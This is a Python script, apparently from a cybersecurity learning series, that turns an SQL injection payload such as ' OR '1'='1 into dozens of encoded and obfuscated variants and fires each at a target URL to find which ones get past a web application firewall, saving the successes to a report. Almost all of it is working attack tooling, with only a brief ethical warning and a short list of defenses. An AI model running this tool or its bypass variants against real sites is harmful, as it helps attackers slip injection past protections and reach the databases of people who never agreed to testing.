#!/usr/bin/env python3
"""
==============================================================
  PROJECT #37 — WAF Evasion Tool
  Generates and tests WAF bypass variants
==============================================================

⚠️⚠️⚠️  ETHICAL WARNING  ⚠️⚠️⚠️
This tool is for EDUCATIONAL PURPOSES ONLY.
- Only test on sites you own or have permission to test
- Do not use for malicious purposes
- This is a cybersecurity learning tool

FEATURES:
- Generate 20+ evasion variants
- URL encoding, double encoding, case manipulation
- Comments, chunked encoding, whitespace tricks
- Test variants against target
- Report successful bypasses

DEFENSES AGAINST WAF EVASION:
1. Input validation at application level
2. Multiple decoding layers
3. Whitelist approach (allow known good)
4. Behavioral analysis
5. Rate limiting
6. Regular expression pattern updates
==============================================================

USAGE:
--------
  # Test a payload against a target
  python waf_evader.py --payload "' OR '1'='1" --url "http://testphp.vulnweb.com/artists.php?artist=1"
  
  # With custom output file
  python waf_evader.py --payload "' OR '1'='1" --url "http://testphp.vulnweb.com/artists.php?artist=1" --output bypasses.txt
  
  # Verbose output
  python waf_evader.py --payload "' OR '1'='1" --url "http://testphp.vulnweb.com/artists.php?artist=1" --verbose
==============================================================
"""

import os
import sys
import re
import time
import urllib.parse
import random
import string
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[-] requests not installed. Run: pip install requests")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED=''; GREEN=''; YELLOW=''; BLUE=''; CYAN=''; MAGENTA=''; WHITE=''
        LIGHTBLACK_EX=''; LIGHTRED_EX=''; LIGHTGREEN_EX=''; LIGHTYELLOW_EX=''
        LIGHTBLUE_EX=''; LIGHTMAGENTA_EX=''; LIGHTCYAN_EX=''
    class Style:
        BRIGHT=''; DIM=''; RESET_ALL=''

class Colors:
    HEADER = Fore.CYAN + Style.BRIGHT
    OKBLUE = Fore.BLUE + Style.BRIGHT
    OKGREEN = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    FAIL = Fore.RED + Style.BRIGHT
    ENDC = Style.RESET_ALL
    BOLD = Style.BRIGHT
    DIM = Fore.LIGHTBLACK_EX
    MAGENTA = Fore.MAGENTA + Style.BRIGHT
    RED = Fore.RED + Style.BRIGHT
    YELLOW = Fore.YELLOW + Style.BRIGHT
    GREEN = Fore.GREEN + Style.BRIGHT
    CYAN = Fore.CYAN + Style.BRIGHT

class WAFEvader:
    def __init__(self, payload, target_url, param=None, output_file="bypasses.txt", verbose=False):
        self.original_payload = payload
        self.target_url = target_url
        self.param = param or self.detect_param()
        self.output_file = output_file
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.variants = []
        self.results = []
        self.base_params = {}
        self.base_url = None
        self.bypasses = []
        
    def detect_param(self):
        """Detect parameter from URL"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if params:
            return list(params.keys())[0]
        return None
    
    def parse_url(self):
        """Parse URL and extract parameters"""
        parsed = urlparse(self.target_url)
        self.base_params = parse_qs(parsed.query)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        self.base_params = {k: v[0] for k, v in self.base_params.items()}
        return self.base_params
    
    def banner(self):
        print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.HEADER}  PROJECT #37 — WAF Evasion Tool{Colors.ENDC}")
        print(f"{Colors.OKBLUE}  Generating and testing WAF bypass variants{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
        
        print(f"{Colors.RED}⚠️⚠️⚠️  ETHICAL WARNING  ⚠️⚠️⚠️{Colors.ENDC}")
        print(f"{Colors.YELLOW}Only test on sites you own or have permission to test.{Colors.ENDC}\n")
        
        print(f"{Colors.OKGREEN}[+] Target: {self.target_url}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Parameter: {self.param}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Payload: {self.original_payload}{Colors.ENDC}\n")
    
    def url_encode(self, payload):
        """URL encode payload"""
        return urllib.parse.quote(payload, safe='')
    
    def double_url_encode(self, payload):
        """Double URL encode payload"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    def case_manipulate(self, payload):
        """Generate case variants"""
        variants = []
        # SQL keywords case manipulation
        keywords = ['OR', 'AND', 'SELECT', 'UNION', 'FROM', 'WHERE']
        for keyword in keywords:
            if keyword in payload.upper():
                # All caps
                variants.append(payload.replace(keyword, keyword.upper()))
                # All lower
                variants.append(payload.replace(keyword, keyword.lower()))
                # Random case
                random_case = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in keyword)
                variants.append(payload.replace(keyword, random_case))
        return variants
    
    def add_comments(self, payload):
        """Add SQL comments to payload"""
        variants = []
        # /**/ style comments
        variants.append(payload.replace(' ', '/**/'))
        variants.append(payload.replace('OR', '/**/OR/**/'))
        variants.append(payload.replace('AND', '/**/AND/**/'))
        variants.append(payload.replace("'", "'/**/"))
        # -- style comments
        variants.append(f"{payload} --")
        variants.append(f"{payload} -- -")
        variants.append(f"{payload} #")
        return variants
    
    def whitespace_tricks(self, payload):
        """Add whitespace variants"""
        variants = []
        whitespaces = ['%0a', '%0b', '%0c', '%0d', '%09', '%20', '/*!*/']
        for ws in whitespaces:
            variants.append(payload.replace(' ', ws))
            variants.append(payload.replace('OR', f'OR{ws}'))
            variants.append(payload.replace('AND', f'AND{ws}'))
        # Tab and newline
        variants.append(payload.replace(' ', '\t'))
        variants.append(payload.replace(' ', '\n'))
        return variants
    
    def hex_encode(self, payload):
        """Hex encode parts of payload"""
        variants = []
        # Hex encode quotes
        variants.append(payload.replace("'", '0x27'))
        variants.append(payload.replace("'", '%27'))
        # Hex encode characters
        hex_chars = ''.join(f'%{ord(c):02x}' for c in payload)
        variants.append(hex_chars)
        return variants
    
    def sql_comments(self, payload):
        """Add SQL comments"""
        variants = []
        variants.append(f"/*!{payload}*/")
        variants.append(f"/*!50000{payload}*/")
        variants.append(f"/*!50001{payload}*/")
        return variants
    
    def null_byte_injection(self, payload):
        """Add null bytes"""
        variants = []
        variants.append(payload.replace(' ', '%00'))
        variants.append(payload.replace("'", "%00'"))
        variants.append(f"{payload}%00")
        return variants
    
    def generate_variants(self):
        """Generate all evasion variants"""
        print(f"{Colors.OKBLUE}[*] Generating evasion variants...{Colors.ENDC}")
        
        payload = self.original_payload
        variants = set()
        
        # 1. Original
        variants.add(payload)
        
        # 2. URL encoded
        variants.add(self.url_encode(payload))
        
        # 3. Double URL encoded
        variants.add(self.double_url_encode(payload))
        
        # 4. Case manipulation
        for variant in self.case_manipulate(payload):
            variants.add(variant)
        
        # 5. Comments
        for variant in self.add_comments(payload):
            variants.add(variant)
        
        # 6. Whitespace tricks
        for variant in self.whitespace_tricks(payload):
            variants.add(variant)
        
        # 7. Hex encoding
        for variant in self.hex_encode(payload):
            variants.add(variant)
        
        # 8. SQL comments
        for variant in self.sql_comments(payload):
            variants.add(variant)
        
        # 9. Null byte injection
        for variant in self.null_byte_injection(payload):
            variants.add(variant)
        
        # 10. Chunked encoding (simulated)
        chunked = []
        for i in range(1, len(payload)):
            chunked.append(payload[:i] + payload[i:])
        for variant in chunked[:5]:
            variants.add(variant)
        
        # 11. Mixed encoding (URL + comments)
        for variant in list(variants)[:5]:
            variants.add(self.url_encode(variant))
        
        # 12. Unusual quotes
        variants.add(payload.replace("'", '"'))
        variants.add(payload.replace("'", "`"))
        variants.add(payload.replace("'", "´"))
        
        # 13. Double quotes
        variants.add(payload.replace("'", "''"))
        
        # 14. Percent sign trick
        variants.add(payload.replace("'", "%25%27"))
        
        # 15. Character entity encoding
        variants.add(payload.replace("'", "&#39;"))
        variants.add(payload.replace("'", "&#x27;"))
        
        # 16. Backslash escape
        variants.add(payload.replace("'", "\\'"))
        
        # 17. Unicode encoding
        variants.add(payload.replace("'", "\\u0027"))
        variants.add(payload.replace("'", "\\x27"))
        
        # 18. IP address as integer
        # Not applicable for SQL injection, but included for completeness
        
        self.variants = list(variants)
        print(f"{Colors.OKGREEN}[+] Generated {len(self.variants)} variants{Colors.ENDC}")
        return self.variants
    
    def test_variant(self, variant):
        """Test a single variant against the target"""
        params = self.base_params.copy()
        
        # Special handling for different parameter types
        if self.param and self.param in params:
            original_value = params[self.param]
            # If original value exists, append variant
            if original_value:
                params[self.param] = f"{original_value}{variant}"
            else:
                params[self.param] = variant
        else:
            params[self.param] = variant
        
        try:
            time.sleep(0.1)  # Small delay
            response = self.session.get(self.base_url, params=params, timeout=10)
            
            # Check for successful bypass
            # Success indicators: No error, normal response
            blocked_indicators = [
                'blocked', 'forbidden', 'access denied', 'unauthorized',
                'waf', 'firewall', 'security', 'malicious', 'suspicious',
                'invalid input', 'attack detected', 'request rejected'
            ]
            
            is_blocked = False
            for indicator in blocked_indicators:
                if indicator in response.text.lower():
                    is_blocked = True
                    break
            
            # Also check for SQL errors (which means it reached the DB)
            sql_indicators = [
                'sql syntax', 'mysql_fetch', 'ora-', 'odbc',
                'unclosed quotation', 'you have an error in your sql',
                'sqlite', 'driver', 'warning: mysql', 'invalid query'
            ]
            
            is_sql_error = False
            for indicator in sql_indicators:
                if indicator in response.text.lower():
                    is_sql_error = True
                    break
            
            # If not blocked and (has SQL error or normal response), it's a bypass
            if not is_blocked:
                result = {
                    'variant': variant,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'is_sql_error': is_sql_error,
                    'is_bypass': True,
                    'response_preview': response.text[:200] if is_sql_error else response.text[:100]
                }
                
                if is_sql_error:
                    print(f"{Colors.FAIL}[!] BYPASS FOUND! (SQL Error){Colors.ENDC}")
                else:
                    print(f"{Colors.OKGREEN}[+] BYPASS FOUND! (Normal response){Colors.ENDC}")
                
                return result
            
            return None
            
        except Exception as e:
            if self.verbose:
                print(f"{Colors.DIM}[!] Error testing variant: {e}{Colors.ENDC}")
            return None
    
    def test_all_variants(self):
        """Test all variants against the target"""
        print(f"\n{Colors.OKBLUE}[*] Testing {len(self.variants)} variants...{Colors.ENDC}\n")
        
        for i, variant in enumerate(self.variants):
            if self.verbose:
                print(f"{Colors.DIM}[*] Testing variant {i+1}/{len(self.variants)}: {variant[:50]}{Colors.ENDC}")
            
            result = self.test_variant(variant)
            if result:
                self.results.append(result)
                self.bypasses.append(result)
        
        # Sort bypasses by response length (potential indicators)
        self.bypasses.sort(key=lambda x: x['response_length'], reverse=True)
        
        print(f"\n{Colors.OKGREEN}[+] Found {len(self.bypasses)} successful bypasses{Colors.ENDC}")
        return self.bypasses
    
    def save_bypasses(self):
        """Save bypasses to file"""
        if not self.bypasses:
            print(f"{Colors.WARNING}[!] No bypasses to save{Colors.ENDC}")
            return
        
        try:
            with open(self.output_file, 'w') as f:
                f.write("="*80 + "\n")
                f.write(f"WAF BYPASS REPORT\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target: {self.target_url}\n")
                f.write(f"Parameter: {self.param}\n")
                f.write(f"Original Payload: {self.original_payload}\n")
                f.write("="*80 + "\n\n")
                f.write(f"Found {len(self.bypasses)} bypasses:\n\n")
                
                for i, bypass in enumerate(self.bypasses, 1):
                    f.write(f"[{i}] Variant: {bypass['variant']}\n")
                    f.write(f"    Status: {bypass['status_code']}\n")
                    f.write(f"    Length: {bypass['response_length']}\n")
                    f.write(f"    SQL Error: {bypass['is_sql_error']}\n")
                    if bypass.get('response_preview'):
                        f.write(f"    Response Preview: {bypass['response_preview'][:100]}...\n")
                    f.write("\n")
            
            print(f"{Colors.OKGREEN}[+] Bypasses saved to {self.output_file}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[-] Failed to save: {e}{Colors.ENDC}")
    
    def print_summary(self):
        """Print summary of results"""
        print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.BOLD}  SUMMARY{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Total variants: {len(self.variants)}{Colors.ENDC}")
        print(f"{Colors.FAIL}[+] Successful bypasses: {len(self.bypasses)}{Colors.ENDC}")
        
        if self.bypasses:
            print(f"\n{Colors.FAIL}Top bypasses:{Colors.ENDC}")
            for i, bypass in enumerate(self.bypasses[:10], 1):
                print(f"  {i}. {Colors.OKGREEN}{bypass['variant'][:80]}{Colors.ENDC}")
        
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
    
    def run(self):
        """Main execution"""
        self.banner()
        
        if not REQUESTS_AVAILABLE:
            print(f"{Colors.FAIL}[-] requests not available{Colors.ENDC}")
            return
        
        if not self.param:
            print(f"{Colors.FAIL}[-] No parameter found in URL{Colors.ENDC}")
            return
        
        self.parse_url()
        self.generate_variants()
        self.test_all_variants()
        self.save_bypasses()
        self.print_summary()

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="WAF Evasion Tool")
    parser.add_argument("--payload", required=True, help="Payload to test (e.g., ' OR '1'='1)")
    parser.add_argument("--url", required=True, help="Target URL with parameter")
    parser.add_argument("--param", help="Parameter name (auto-detected if not provided)")
    parser.add_argument("--output", default="bypasses.txt", help="Output file for bypasses")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    evader = WAFEvader(
        payload=args.payload,
        target_url=args.url,
        param=args.param,
        output_file=args.output,
        verbose=args.verbose
    )
    
    evader.run()

if __name__ == "__main__":
    main()